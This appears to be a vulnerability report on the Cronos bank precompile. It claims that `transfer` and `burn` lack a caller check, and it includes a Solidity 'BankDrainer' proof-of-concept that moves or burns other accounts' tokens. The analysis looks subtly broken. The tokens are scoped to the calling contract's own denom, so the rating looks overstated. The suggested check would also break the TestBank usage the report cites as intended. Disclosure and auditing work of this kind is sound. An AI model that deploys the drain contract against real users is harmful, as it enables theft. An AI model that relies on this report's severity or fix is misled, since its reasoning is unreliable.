### Title
Unauthorized Transfer and Burn of Native EVM-Denom Tokens via Missing Caller Authorization in Bank Precompile — (File: x/cronos/keeper/precompiles/bank.go)

---

### Summary

The bank precompile's `transfer` and `burn` methods accept the source address as a calldata argument but never verify that `contract.Caller()` matches that address. Any EVM contract can therefore drain or destroy another account's native `evm/<contractAddress>` tokens without the owner's consent.

---

### Finding Description

The bank precompile at `x/cronos/keeper/precompiles/bank.go` exposes four methods: `mint`, `burn`, `balanceOf`, and `transfer`. The denom operated on is always `evm/<contract.Caller()>`, scoping each contract to its own native-token namespace.

**`transfer` (lines 167–200):**

```go
sender    := args[0].(common.Address)   // taken from calldata — arbitrary
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
from      := sdk.AccAddress(sender.Bytes())
to        := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller()) // "evm/<callerContract>"
// ← NO check: contract.Caller() == sender
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

**`burn` (lines 113–156):**

```go
recipient := args[0].(common.Address)   // taken from calldata — arbitrary
addr      := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller())
// ← NO check: contract.Caller() == recipient
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

The intended usage (shown in `TestBank.sol` line 37) is `bank.transfer(msg.sender, recipient, amount)` — the contract passes its own caller as the source. But nothing enforces this. Any contract at address `0xABC` can call `bank.transfer(victim, attacker, amount)` or `bank.burn(victim, amount)` and the precompile will execute the transfer/burn of `evm/0xABC` tokens from `victim` without any authorization from `victim`. [1](#0-0) [2](#0-1) [3](#0-2) 

---

### Impact Explanation

**Critical — Unauthorized transfer/burn of native bank-module assets.**

`evm/<contractAddress>` tokens are real Cosmos SDK bank-module coins. They are minted when a user calls `bank.mint(user, amount)` from a contract (e.g., `TestBank.moveToNative`), and they can be received via IBC conversion through `ConvertVouchersToEvmCoins`. Once a user holds such tokens, any contract at the issuing address can:

1. **Transfer** them to an attacker-controlled address via `bank.transfer(victim, attacker, amount)`.
2. **Burn** them outright via `bank.burn(victim, amount)`, permanently destroying the victim's balance.

Both operations bypass the victim's consent entirely and result in an irreversible accounting change in the Cosmos bank module. [4](#0-3) [5](#0-4) 

---

### Likelihood Explanation

Any unprivileged EVM contract can reach the bank precompile at `0x0000000000000000000000000000000000000064` directly. No special role, governance action, or leaked key is required. The attack is a single EVM call. Any contract that (a) has ever called `bank.mint` to give users native tokens, or (b) whose denom users hold for any reason, is a viable attack vector. The `TestBank` contract pattern is explicitly documented and encouraged. [6](#0-5) [7](#0-6) 

---

### Recommendation

In both `transfer` and `burn`, enforce that the source address equals the immediate EVM caller:

```go
// transfer
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the sender")
}

// burn
if contract.Caller() != recipient {
    return nil, errors.New("burn: caller is not the token owner")
}
```

This mirrors the authorization model already used by `mint_by_cronos_module` in the CRC20/CRC21 contracts (`require(msg.sender == module_address)`), and matches the intended usage shown in `TestBank.sol`. [8](#0-7) [9](#0-8) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
}

// Attacker contract deployed at address 0xATTACKER_CONTRACT
contract BankDrainer {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: victim previously called a legitimate contract at THIS address
    //         which called bank.mint(victim, 1000), giving victim 1000 evm/0xATTACKER_CONTRACT tokens.
    //
    // Step 2: attacker calls stealTokens(victim, attacker_eoa, 1000)
    function stealTokens(address victim, address attacker, uint256 amount) external {
        // denom = evm/address(this); sender = victim (arbitrary, no auth check)
        bank.transfer(victim, attacker, amount);
    }

    // Alternatively: destroy victim's tokens
    function burnVictimTokens(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

**Attack flow:**

1. Victim holds `evm/0xATTACKER_CONTRACT` native tokens (e.g., from a prior `bank.mint` call or IBC conversion).
2. Attacker calls `BankDrainer.stealTokens(victim, attacker_eoa, victimBalance)`.
3. The bank precompile executes `bankKeeper.SendCoins(victim_cosmos_addr, attacker_cosmos_addr, coins)` — no authorization from victim is checked.
4. Victim's entire `evm/0xATTACKER_CONTRACT` balance is transferred to the attacker in a single transaction. [10](#0-9) [11](#0-10)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L32-33)
```go
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/events/bindings/src/Bank.sol (L1-9)
```text
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address,uint256) external payable returns (bool);
    function balanceOf(address,address) external view returns (uint256);
    function burn(address,uint256) external payable returns (bool);
    function transfer(address,address,uint256) external payable returns (bool);
}
```

**File:** integration_tests/contracts/contracts/TestBank.sol (L14-38)
```text
    function moveToNative(uint256 amount) public returns (bool) {
        _burn(msg.sender, amount);
        return bank.mint(msg.sender, amount);
    }

    function moveFromNative(uint256 amount) public returns (bool) {
        bool result = bank.burn(msg.sender, amount);
        require(result, "native call");
        _mint(msg.sender, amount);
        return result;
    }

    function nativeBalanceOf(address addr) public returns (uint256) {
        return bank.balanceOf(address(this), addr);
    }

    function moveToNativeRevert(uint256 amount) public {
        moveToNative(amount);
        revert("test");
    }

    function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return bank.transfer(msg.sender, recipient, amount);
    }
```

**File:** contracts/src/ModuleCRC20.sol (L31-34)
```text
    function mint_by_cronos_module(address addr, uint amount) public {
        require(msg.sender == module_address);
        mint(addr, amount);
    }
```
